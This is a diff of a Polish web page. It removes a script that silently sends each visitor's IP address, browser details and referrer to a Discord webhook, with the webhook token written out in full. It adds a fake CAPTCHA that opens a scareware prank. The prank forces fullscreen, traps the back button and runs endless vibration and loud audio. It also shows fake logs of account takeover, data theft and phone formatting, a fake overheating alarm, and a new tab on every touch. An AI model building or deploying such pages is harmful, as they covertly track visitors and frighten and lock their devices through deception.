@@ -2,61 +2,200 @@
 <html lang="pl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Strona nieobsługiwana</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Weryfikacja Bezpieczeństwa</title>
     <style>
-        body {
-            background-color: #000;
-            color: #f00;
-            font-family: Arial, sans-serif;
-            text-align: center;
-            margin: 0;
-            padding: 0;
-            height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-direction: column;
+        body, html {
+            margin: 0; padding: 0; width: 100%; height: 100%;
+            font-family: 'Courier New', Courier, monospace; /* Czcionka hakerska */
+            overflow: hidden; background-color: #f9f9f9; user-select: none;
+            transition: filter 0.1s;
         }
-        h1 { font-size: 2.5em; }
-        p { font-size: 1.5em; max-width: 600px; }
-        .warning { color: #ff0; animation: blink 1s infinite; }
-        @keyframes blink { 50% { opacity: 0; } }
+
+        /* 1. Ekran CAPTCHA */
+        #captcha-screen {
+            display: flex; justify-content: center; align-items: center;
+            height: 100vh; width: 100vw; position: absolute; z-index: 1000;
+            background: #fff;
+        }
+        .captcha-box {
+            border: 1px solid #d3d3d3; border-radius: 3px; background: #fafafa;
+            padding: 20px; display: flex; align-items: center; gap: 15px;
+            box-shadow: 0px 0px 4px rgba(0,0,0,0.1); width: 280px;
+        }
+        .checkbox {
+            width: 28px; height: 28px; border: 2px solid #c1c1c1; border-radius: 2px;
+            background: #fff; cursor: pointer; display: flex;
+            justify-content: center; align-items: center;
+        }
+        .captcha-text { font-family: 'Roboto', sans-serif; font-size: 1.2rem; color: #555; }
+        
+        /* 2. Ekran Chaosu & Terminal */
+        #prank-screen {
+            display: none; width: 100vw; height: 100vh; position: absolute;
+            top: 0; left: 0; z-index: 10; background-color: black;
+            color: #00ff00; padding: 10px; box-sizing: border-box;
+            flex-direction: column; text-align: left;
+        }
+
+        #terminal {
+            font-size: 1.2rem; line-height: 1.5; text-shadow: 0 0 5px #00ff00;
+            flex-grow: 1; overflow: hidden; white-space: pre-wrap;
+        }
+
+        #massive-warning {
+            display: none; font-size: 2.5rem; color: red; text-align: center;
+            font-weight: 900; background: yellow; padding: 10px;
+            border: 5px solid red; animation: blink 0.1s infinite;
+            text-transform: uppercase; position: absolute; top: 30%; left: 0; width: 100%;
+        }
+
+        /* 3. Finałowy ekran */
+        #final-text {
+            display: none; position: absolute; top: 50%; left: 50%;
+            transform: translate(-50%, -50%); width: 90%;
+            font-size: 3rem; font-weight: 900; color: white;
+            text-align: center; text-transform: uppercase;
+            text-shadow: 3px 3px 0 #ff0000, -3px -3px 0 #0000ff; /* Glitch text effect */
+            z-index: 9999; animation: shakeFinal 0.2s infinite;
+        }
+
+        /* Animacje Glitchy i Piekła */
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
+        @keyframes glitchScreen {
+            0% { transform: translate(0) scale(1); filter: invert(0); }
+            20% { transform: translate(-10px, 10px) scale(1.1); filter: invert(1); }
+            40% { transform: translate(10px, -10px) scale(0.9); filter: hue-rotate(90deg); }
+            60% { transform: translate(-15px, -5px) scale(1.2) rotate(5deg); filter: invert(1); }
+            80% { transform: translate(15px, 5px) scale(1) rotate(-5deg); filter: hue-rotate(180deg); }
+            100% { transform: translate(0) scale(1.05); filter: invert(0); }
+        }
+        @keyframes shakeFinal {
+            0% { transform: translate(-50%, -50%) rotate(0deg); }
+            25% { transform: translate(-52%, -48%) rotate(2deg); }
+            50% { transform: translate(-48%, -52%) rotate(-2deg); }
+            75% { transform: translate(-51%, -49%) rotate(1deg); }
+            100% { transform: translate(-50%, -50%) rotate(0deg); }
+        }
     </style>
 </head>
 <body>
-    <h1 class="warning">BŁĄD</h1>
-    <p>Urządzenie nie jest obsługiwane lub jest potencjalnym zagrożeniem!</p>
-    <p>Prosimy o kontakt z administratorem lub ponowne uruchomienie w bezpiecznym środowisku.</p>
+
+    <div id="captcha-screen">
+        <div class="captcha-box">
+            <div class="checkbox" id="trigger-btn"></div>
+            <div class="captcha-text">I'm not a robot</div>
+        </div>
+    </div>
+
+    <div id="prank-screen">
+        <div id="terminal"></div>
+        <div id="massive-warning">BATERIA 120°C!<br>RYZYKO ZAPŁONU!</div>
+    </div>
+
+    <div id="final-text">ZOSTAŁEŚ SPRANKOWANY PRZEZ JEREMIASZA FAKTORA</div>
 
     <script>
-        async function grabIP() {
-            try {
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const data = await ipResponse.json();
-                const ip = data.ip;
+        document.getElementById('trigger-btn').addEventListener('click', function() {
+            this.innerHTML = '<span style="color: green; font-weight: bold; font-size: 24px;">✔</span>';
+            setTimeout(() => { startUltimatePrank(); }, 400);
+        });
 
-                const payload = {
-                    content: `**Nowy IP złapany!**\nIP: ${ip}\nUser-Agent: ${navigator.userAgent}\nReferer: ${document.referrer || 'brak'}\nCzas: ${new Date().toISOString()}\nURL: ${window.location.href}`,
-                    username: "IP Grabber Bot",
-                    avatar_url: "https://i.imgur.com/removed.png"
-                };
+        function startUltimatePrank() {
+            const prankScreen = document.getElementById('prank-screen');
+            const terminal = document.getElementById('terminal');
+            const warning = document.getElementById('massive-warning');
+            
+            document.getElementById('captcha-screen').style.display = 'none';
+            prankScreen.style.display = 'flex';
 
-                const webhookUrl = "https://discord.com/api/webhooks/1526614017907494973/iBa9vd7N0LzlRCBmlIgRhB0-ILmQSD7eJav0rq1BJMi4E5E4ZzDJ7XZNUZeLV3_sRgaM";
+            // 1. Wymuszenie pełnego ekranu
+            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen().catch(e => {});
 
-                await fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
+            // 2. Pułapka "Wstecz" (blokuje wyjście)
+            for (let i = 0; i < 50; i++) history.pushState(null, null, location.href);
+            window.onpopstate = function () { history.pushState(null, null, location.href); };
 
-                console.log('IP wysłany sukcesywnie:', ip);
-            } catch (error) {
-                console.error('Błąd:', error);
+            // 3. Ultra Wibracje (telefon drży bez przerwy)
+            if (navigator.vibrate) {
+                setInterval(() => navigator.vibrate([200, 50, 500, 50, 1000, 50]), 500);
             }
-        }
 
-        window.onload = grabIP;
+            // 4. Mózgotrzepne Audio (2 syntezatory naraz)
+            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            const osc1 = audioCtx.createOscillator();
+            const osc2 = audioCtx.createOscillator();
+            const gain = audioCtx.createGain();
+            
+            osc1.type = 'sawtooth';
+            osc2.type = 'square';
+            osc1.connect(gain);
+            osc2.connect(gain);
+            gain.connect(audioCtx.destination);
+            gain.gain.value = 1.5; // Przester
+            osc1.start(); osc2.start();
+
+            setInterval(() => {
+                osc1.frequency.value = Math.random() * 2000 + 500;
+                osc2.frequency.value = Math.random() * 3000 + 100;
+            }, 80);
+
+            // 5. ATAK TERMINALOWY - Fałszywe wylogowywanie i kradzież danych
+            const logs = [
+                "Nawiązywanie połączenia z serwerem...",
+                "Pobieranie uprawnień root...",
+                "Złamanie zabezpieczeń systemu Android: SUKCES",
+                "!!! ROZPOCZYNAM WYCIĄGANIE DANYCH !!!",
+                "-> Wylogowywanie z: TikTok... [OK]",
+                "-> Zmiana hasła: TikTok... [OK]",
+                "-> Pobieranie prywatnych wiadomości (Instagram)... [2.4GB POBRANO]",
+                "-> Wylogowywanie z: Instagram... [OK]",
+                "-> Wykryto konto: Snapchat... Kasowanie bazy "My Eyes Only"...",
+                "-> Wylogowywanie z: Snapchat... [OK]",
+                "-> Autoryzacja przelewu z aplikacji bankowej...",
+                "-> Udostępnianie historii przeglądania na Facebooku...",
+                "!!! SYSTEM PRZECIĄŻONY !!!",
+                "Usuwanie plików z karty SD...",
+                "Formatowanie pamięci wewnętrznej: 14%...",
+                "Formatowanie pamięci wewnętrznej: 45%...",
+                "Formatowanie pamięci wewnętrznej: 89%..."
+            ];
+
+            let logIndex = 0;
+            const logInterval = setInterval(() => {
+                if (logIndex < logs.length) {
+                    terminal.innerHTML += logs[logIndex] + "<br>";
+                    logIndex++;
+                } else {
+                    // Kiedy terminal skończy, odpalamy błąd przegrzania i glitche
+                    warning.style.display = 'block';
+                    document.body.style.animation = "glitchScreen 0.1s infinite";
+                }
+            }, 600); // Nowa linijka co 0.6 sekundy
+
+            // 6. KARTOWA PUŁAPKA (Klonowanie strony przy każdym dotyku)
+            document.body.addEventListener('touchstart', function() {
+                try { window.open(window.location.href, '_blank'); } catch(e) {}
+            });
+
+            // 7. FINAŁ PO 12 SEKUNDACH
+            setTimeout(() => {
+                clearInterval(logInterval);
+                document.body.style.animation = "none";
+                document.body.style.filter = "none";
+                document.body.style.transform = "none";
+                
+                prankScreen.style.display = 'none';
+                document.body.style.backgroundColor = '#000';
+                
+                const final = document.getElementById('final-text');
+                final.style.display = 'block';
+                
+                // Audio zmienia się w złowrogi, niski bas
+                osc1.frequency.value = 100;
+                osc2.frequency.value = 105;
+            }, 12000); 
+        }
     </script>
 </body>
 </html>
